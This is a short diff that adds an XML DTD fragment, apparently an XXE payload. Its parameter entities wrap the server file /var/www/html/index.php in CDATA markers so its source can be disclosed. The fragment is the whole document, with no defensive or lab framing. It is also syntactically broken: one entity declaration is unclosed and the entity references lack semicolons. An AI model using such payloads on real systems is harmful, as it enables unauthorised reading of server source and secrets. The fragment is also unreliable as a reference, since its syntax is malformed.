@@ -1,0 +1,4 @@
+<!ENTITY % begin "<![CDATA[">
+<!ENTITY % end "]]>"
+<!ENTITY % somefile SYSTEM "file:///var/www/html/index.php">
+<!ENTITY % name "%begin%somefile%end">
